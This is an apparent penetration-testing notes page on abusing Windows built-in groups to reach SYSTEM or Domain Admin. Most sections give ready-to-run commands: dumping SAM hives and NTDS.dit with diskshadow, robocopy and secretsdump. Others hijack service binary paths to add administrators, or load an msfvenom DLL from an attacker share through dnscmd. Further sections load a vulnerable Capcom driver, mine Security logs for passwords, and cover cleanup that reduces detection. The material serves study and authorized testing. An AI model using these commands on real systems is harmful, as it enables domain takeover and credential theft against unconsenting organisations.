+++
title = 'Built-in Groups Abuse'
date = 2026-10-30
type = 'notes'
weight = 30
toc = true
tags = ['windows', 'privilege-escalation', 'groups', 'privileges']
+++

Windows ships with privileged built-in groups whose membership grants powerful rights short of full administrator — and several are a **direct path to SYSTEM or Domain Admin**. Treat every group below as **Tier-0** on a Domain Controller; membership changes should be monitored, and any foothold account that lands in one of them should be treated as a domain-compromise primitive.

---

## Triage — Which Group Do I Have?

Run this immediately after landing a shell:

```cmd
whoami /groups
net localgroup
```

| Group | Primitive | Payoff | Escalation Section |
|---|---|---|---|
| **Backup Operators** | `SeBackup` + `SeRestore` | Read/write any file → NTDS.dit / SAM / service binary | [1](#1-backup-operators) |
| **Server Operators** | Reconfigure + restart services on DCs | SYSTEM via `sc config binPath=` | [2](#2-server-operators) |
| **DnsAdmins** | Load arbitrary DLL into `dns.exe` (SYSTEM) | SYSTEM on DC → Domain Admin | [3](#3-dnsadmins) |
| **Print Operators** | `SeLoadDriverPrivilege` | BYOVD → kernel R/W → SYSTEM | [4](#4-print-operators) |
| **Hyper-V Administrators** | Full hypervisor control; mount VHDs | Read host files, clone DCs, offline NTDS.dit | [5](#5-hyper-v-administrators) |
| **Event Log Readers** | Read Security log (4688 command lines) | Credential harvesting → escalation | [6](#6-event-log-readers) |
| **Account Operators** | Modify non-protected accounts/groups | AORTA trust attack → Domain Admin | [7](#7-account-operators) |
| **Network Configuration Operators** | Write to `Dnscache` service registry key | SYSTEM via Performance Counters (CVE-2025-21293) | [8](#8-network-configuration-operators) |
| **Cryptographic Operators** | Crypto policy tampering | Tier-0 equivalent | [9](#9-cryptographic-operators) |
| **Remote Desktop Users** | RDP logon only | Lateral movement, not direct escalation | [10](#10-remote-desktop-users) |
| **Remote Management Users** | WinRM / PSRemoting | Lateral movement, not direct escalation | [11](#11-remote-management-users) |

> **Rule:** If `whoami /groups` shows **Backup Operators**, **Server Operators**, **DnsAdmins**, or **Print Operators**, stop enumerating and go to that section — these are direct SYSTEM/DA paths.

---

## 1. Backup Operators

> Membership grants `SeBackupPrivilege` and `SeRestorePrivilege`. **`SeBackupPrivilege`** lets a process open any file with `FILE_FLAG_BACKUP_SEMANTICS` and **skip the DACL check entirely** — designed so backup agents can copy the disk without restriction. **`SeRestorePrivilege`** does the same for writes.

### Confirm membership and privilege

```cmd
whoami /groups | findstr /i "Backup Operators"
whoami /priv | findstr /i "SeBackup SeRestore"
```

> **Important:** `whoami /priv` often shows the privilege as **Disabled**. This does **not** mean it is unavailable — any process can call `AdjustTokenPrivileges` to enable it at runtime, and exploitation tools do this transparently.

### Exploitation — dump SAM / SYSTEM / SECURITY (local machine)

```cmd
reg save hklm\sam C:\Temp\sam.save
reg save hklm\system C:\Temp\system.save
reg save hklm\security C:\Temp\security.save
```

Transfer the hives back and parse offline:

```bash
impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL
```

### Exploitation — NTDS.dit (Domain Controller)

On a DC, `SeBackupPrivilege` also grants access to `NTDS.dit`. Use `diskshadow` to create a volume shadow copy and copy the database + SYSTEM hive:

```cmd
diskshadow.exe
# In the diskshadow prompt:
set context persistent nowriters
set metadata C:\Windows\Temp\meta.cab
set verbose on
add volume C: alias cdrive
create
expose %cdrive% Z:
```

Then copy with `robocopy` in backup mode (requires **both** `SeBackup` and `SeRestore` for `/b`):

```cmd
robocopy /b Z:\Windows\NTDS C:\Temp NTDS.dit
reg save hklm\system C:\Temp\system.save
```

Parse offline:

```bash
impacket-secretsdump -ntds NTDS.dit -system system.save LOCAL
```

### Alternative — overwrite a SYSTEM-executed binary (`SeRestorePrivilege`)

`SeRestorePrivilege` lets you **write to any file regardless of ACLs**. Replace a binary that a SYSTEM service runs:

```cmd
# Copy a payload over a service binary (backup the original first)
copy /y C:\Temp\payload.exe C:\Program Files\Vulnerable\service.exe
sc stop VulnerableSvc
sc start VulnerableSvc
```

This is the write-side counterpart to `SeBackup` — and is often overlooked because most write-ups focus only on reading NTDS.dit.

---

## 2. Server Operators

> Server Operators can **administer Domain Controllers, including managing services**. Because most services run as `LocalSystem`, a Server Operator can **reconfigure a service's binary path** to an attacker payload and restart it, executing code as **SYSTEM on the DC**. This uses nothing but the standard `sc` commands the group is designed to allow.

### Confirm membership

```cmd
whoami /groups | findstr /i "Server Operators"
```

### Exploitation — `sc config binPath=`

```cmd
:: Pick a non-critical service you can restart
sc qc VulnSvc

:: Hijack its binary path
sc config VulnSvc binPath= "C:\Windows\Temp\add_admin.exe"

:: One-liner to add a local/domain admin
sc config VulnSvc binPath= "cmd /c net localgroup administrators pwn /add"

:: Restart to run the new command as SYSTEM
sc stop VulnSvc & sc start VulnSvc

:: Restore the original binPath afterwards to reduce IOCs
```

The mechanics are identical to an insecure service permission — the difference is that **Server Operators membership grants the reconfigure right by design**. This is one of the most direct built-in-group escalations on a DC.

---

## 3. DnsAdmins

> `dns.exe` runs as **SYSTEM**, often on a Domain Controller. The DNS management protocol lets an admin specify a **server-level plugin DLL**; the service loads that DLL on restart **with no validation**. A DnsAdmins member can point the service at an attacker DLL on a share and execute code as SYSTEM on the DC — frequently a direct path to Domain Admin.

### Confirm membership

```cmd
whoami /groups | findstr /i "DnsAdmins"
```

### Exploitation — `dnscmd /serverlevelplugindll`

**Step 1 — generate the DLL:**

```bash
msfvenom -p windows/x64/exec cmd='net group "Domain Admins" pwn /add /domain' \
  -f dll -o evil.dll
```

**Step 2 — host it on an SMB share the DC can reach.**

**Step 3 — register the plugin:**

```cmd
dnscmd <dc-name> /config /serverlevelplugindll \\ATTACKER_IP\share\evil.dll
```

**Step 4 — restart the DNS service:**

```cmd
sc stop dns & sc start dns
```

If you cannot restart the service directly, **`wmic`/scheduled maintenance or waiting for a reboot** also triggers the load.

**Step 5 — clean up the registry value:**

```
HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ServerLevelPluginDll
```

> **Note:** Loading a DLL often crashes the DNS service. If that is a concern, cube0x0’s exploit provides a more reliable path that does not depend on a restart.

---

## 4. Print Operators

> Members hold **`SeLoadDriverPrivilege`** — the right to load kernel-mode drivers. Loading a **vulnerable signed driver** (a **BYOVD** attack) yields a kernel read/write primitive that escalates to SYSTEM. Print Operators membership is **effectively SYSTEM**, even though the group’s stated purpose is only managing printers.

### Confirm membership and privilege

```cmd
whoami /groups | findstr /i "Print Operators"
whoami /priv | findstr /i "SeLoadDriver"
```

> If `SeLoadDriverPrivilege` is **not** visible in an unelevated context, **bypass UAC first** — the privilege is present but filtered from the medium-integrity token.

### Exploitation — load a vulnerable driver

```cmd
:: Register a driver service under a user-writable registry path
:: (no admin needed with SeLoadDriverPrivilege)
EoPLoadDriver.exe System\CurrentControlSet\MyService C:\Windows\Temp\Capcom.sys

:: Trigger the vulnerable driver's IOCTL to execute code in the kernel
ExploitCapcom.exe
```

This spawns a **SYSTEM shell**.

> **Warning:** Loading a kernel driver can **BSOD the host**. Only do this on a system you own or are explicitly authorized to test.

---

## 5. Hyper-V Administrators

> Hyper-V Administrators have **complete control over the hypervisor, virtual machines, and their virtual-disk files**. On a virtualization host — including Domain Controllers running as Hyper-V guests — this is a route to SYSTEM. Two practical paths: reading arbitrary host files by mounting them into a VM (or attaching the host disk), and abusing the VM management service’s file operations.

### Confirm membership

```cmd
whoami /groups | findstr /i "Hyper-V Administrators"
```

### Path A — mount a VHD and read the guest filesystem offline

```powershell
Mount-VHD -Path C:\VMs\target.vhdx
# Assign a drive letter, then read the guest filesystem — including NTDS.dit
```

If a Domain Controller is virtualized, cloning the live DC and mounting its virtual disk offline lets you extract `NTDS.dit` and every domain hash.

### Path B — VMM / vmcompute DLL hijack

Historically, the VM management service could be coerced into loading an attacker DLL or following a symlink a Hyper-V Admin created (**CVE-2018-0952** class). Plant a hijackable DLL in a path the service loads and trigger a VM operation.

### Path C — reset a guest’s local admin

For a VM you control, mounting its VHD offline lets you plant a payload or clear the local Administrator password, then boot it.

### Recent Hyper-V CVEs

| CVE | Type | Notes |
|---|---|---|
| **CVE-2025-50167** | Hyper-V EoP | Windows Hyper-V elevation of privilege vulnerability |
| **CVE-2025-54098** | Improper access control | Local privilege escalation, CVSS 7.8 |
| **CVE-2025-24048** | Heap buffer overflow | Local EoP via Hyper-V |
| **CVE-2025-48807** | Hyper-V RCE | Critical, Windows 10/11/Server |
| **CVE-2025-53723** | Hyper-V EoP | Windows Hyper-V elevation of privilege |

> These are kernel-level bugs. If the host is unpatched, they are direct SYSTEM primitives from a Hyper-V Admin context.

---

## 6. Event Log Readers

> Event Log Readers can read the **Windows Security event log** — which does not grant SYSTEM directly, but is a **rich, frequently-overlooked credential source**. When **command-line process-creation auditing (Event ID 4688)** is enabled, every process launch is logged with its **full command line**. Administrators and scripts routinely pass passwords on the command line (`net use`, `runas`, scheduled-task setup, installers).

### Confirm membership

```cmd
whoami /groups | findstr /i "Event Log Readers"
```

### Exploitation — mine 4688 command lines

```powershell
Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4688]]" |
  Where-Object { $_.Message -match '/pass|/user|password|-p ' } |
  Select-Object -First 50 -Expand Message
```

```cmd
:: cmd alternative
wevtutil qe Security /q:"*[System[(EventID=4688)]]" /f:text /c:200 | findstr /i "password /user /pass"
```

Also look for **4648** (explicit credential logon) and **process-creation events with command lines**.

Recovered credentials feed **RunAs**, **Pass-the-Hash**, or lateral movement.

> **CVE-2026-1495** — AVEVA PI to CONNECT Agent logged proxy credentials in a way that Event Log Readers (SID S-1-5-32-573) could obtain, including URL and proxy credentials. This is a reminder that “read-only” log access can leak secrets beyond command lines.

---

## 7. Account Operators

> Members can **create and modify most types of accounts** (users, local groups, global groups) and can log in locally to domain controllers. They **cannot** manage the Administrator account, administrative user accounts, or members of Administrators, Server Operators, Account Operators, Backup Operators, or Print Operators.

### The AORTA attack — Account Operators Replicating Trust Attack

The **Incoming Forest Trust Builders** group (not AdminSDHolder-protected) can create **inbound forest trusts with TGT delegation enabled**. Because the trusted domain object (TDO) for the trust gets **Domain Admins as owner**, an Account Operator can often find a path from Account Operators to Domain Admins — though the exact path depends on custom permissions and varies across environments.

```powershell
# Enumerate trusts and TDO attributes
Get-ADTrust -Filter *
Get-ADObject -Filter {objectClass -eq "trustedDomain"} -Properties *
```

> **Key insight:** Account Operators is often **underestimated** because it does not contain the word “admins.” The AORTA research shows that even without touching Domain Admins directly, an Account Operator can create an impersonation path via trust manipulation.

### Other Account Operator paths

- **Create a new account** and add it to a group that has local admin rights on a target.
- **Modify an existing non-protected account** (e.g., reset a password) and use it to authenticate to a system where it has rights.
- **Kerberoast / AS-REP roast** a service account you can modify.

---

## 8. Network Configuration Operators

> **CVE-2025-21293** — Prior to the January 2025 Windows update, users in **Network Configuration Operators** had **`CreateSubKey` registry rights** under `HKLM\System\CurrentControlSet\Services\Dnscache\`. This allows code execution with **SYSTEM privileges via Windows Performance Counters**.

### Confirm membership and vulnerability

```cmd
whoami /groups | findstr /i "Network Configuration Operators"
reg query HKLM\System\CurrentControlSet\Services\Dnscache /s
```

If `CreateSubKey` is present and the host is unpatched, the group is a **direct SYSTEM path**.

> **Patch status:** Fixed in the January 2025 Windows update. Check `systeminfo` for the relevant KB. On older builds, this is a reliable escalation from a group that administrators often treat as harmless (“just IP configuration”).

---

## 9. Cryptographic Operators

> A built-in local group in the **Builtin** container. Microsoft introduced it to represent the **“Crypto Officer”** role and control certain cryptographic configuration tasks. It has **no default members** and is **not protected by AdminSDHolder** — yet Microsoft still indicates management of the group should not be delegated to non-service admins.

### Why it matters

Cryptographic Operators can perform **crypto policy tampering** in environments that actually use the Windows cryptography API for configuration. Semperis assessment outputs already classify Cryptographic Operators as a **known Tier-0 group** across multiple real environments.

### Enumeration

```cmd
whoami /groups | findstr /i "Cryptographic Operators"
net localgroup "Cryptographic Operators"
```

Even with no default members, the group is a **membership target** — if an attacker can add an account to it (via Account Operators, GPO delegation, or a DACL misconfiguration), it is a Tier-0 escalation.

---

## 10. Remote Desktop Users

> Members are **not given any useful permissions by default**. The main use is to **log in through Remote Desktop Services** and move laterally via RDP.

### Enumeration

```cmd
whoami /groups | findstr /i "Remote Desktop Users"
net localgroup "Remote Desktop Users"
```

### Lateral movement

```bash
# From the attacker host
xfreerdp /v:TARGET_IP /u:USERNAME /p:PASSWORD /cert:ignore
```

RDP is a **lateral movement** path, not a privilege-escalation primitive on its own. It becomes escalation if the RDP session lands on a host where the user has local admin rights, or if RDP is used to reach a system with a known vulnerability.

---

## 11. Remote Management Users

> Members can **log on to DCs with PSRemoting** and are sometimes added to the local remote management group on non-DCs.

### Enumeration

```cmd
whoami /groups | findstr /i "Remote Management Users"
```

### Lateral movement

```bash
# Evil-WinRM
evil-winrm -i TARGET_IP -u USERNAME -p PASSWORD
```

WinRM is also a **lateral movement** path. It is frequently combined with other groups — for example, a Backup Operator who is also a Remote Management User can WinRM into a host and then abuse `SeBackupPrivilege` there.

> **CVE-2025-33073** — A universal exploitation tool targets DCs with **DnsAdmins privileges and WinRM enabled**, combining a WinRM authentication bypass with DNSAdmins to achieve SYSTEM-level code execution.

---

## Quick Reference — Group → Command → Payoff

| Group | Key Command | Payoff |
|---|---|---|
| **Backup Operators** | `diskshadow` + `robocopy /b` + `secretsdump` | Domain hashes → DA |
| **Server Operators** | `sc config <svc> binPath= "cmd /c net localgroup administrators pwn /add"` | SYSTEM on DC |
| **DnsAdmins** | `dnscmd <dc> /config /serverlevelplugindll \\ATTACKER\share\evil.dll` + `sc stop dns & sc start dns` | SYSTEM on DC |
| **Print Operators** | `EoPLoadDriver.exe` + `ExploitCapcom.exe` | Kernel R/W → SYSTEM |
| **Hyper-V Administrators** | `Mount-VHD -Path C:\VMs\target.vhdx` | Host files / NTDS.dit |
| **Event Log Readers** | `Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4688]]"` | Cleartext credentials |
| **Account Operators** | AORTA trust manipulation | Domain Admin (conditional) |
| **Network Configuration Operators** | `Dnscache` registry `CreateSubKey` (CVE-2025-21293) | SYSTEM |
| **Cryptographic Operators** | Crypto policy tampering | Tier-0 |
| **Remote Desktop Users** | `xfreerdp /v:TARGET /u:USER /p:PASS` | Lateral movement |
| **Remote Management Users** | `evil-winrm -i TARGET -u USER -p PASS` | Lateral movement |

---

## Field Notes

- **`whoami /priv` showing “Disabled” is not a dead end.** `SeBackupPrivilege` and `SeRestorePrivilege` can be enabled at runtime by any process with `AdjustTokenPrivileges` — exploitation tools do this automatically.
- **`robocopy /b` requires both `SeBackup` and `SeRestore`**. If you only have `SeBackup`, use `reg save` and `diskshadow` instead.
- **Server Operators is the shortest DC path.** `sc config` + `sc start` on a DC service is a two-command SYSTEM — no exploit, no CVE.
- **DnsAdmins without restart rights is still exploitable.** Wait for a reboot, a scheduled maintenance window, or use `wmic` to trigger the service restart indirectly.
- **Print Operators needs UAC bypass first if `SeLoadDriver` is filtered.** Check `whoami /priv` from an unelevated context — if the privilege is missing, bypass UAC before loading the driver.
- **Account Operators is not “just account management.”** AORTA shows that the group can reach Domain Admin through trust manipulation without touching protected groups.
- **Network Configuration Operators was a real SYSTEM bug** (CVE-2025-21293) — treat it as Tier-0 on unpatched hosts, not as a harmless IP-config group.
- **Cryptographic Operators has no default members but is Tier-0.** A single misconfigured delegation or ACL that allows adding a member is a domain-compromise primitive.
- **Remote Desktop Users and Remote Management Users are force multipliers, not escalations.** Their value is combining them with another group (Backup Operator + WinRM, Server Operator + RDP) to reach a host where the escalation primitive lives.

Full context: [HTB Windows machines](/notes/oscp-labs/windows/).
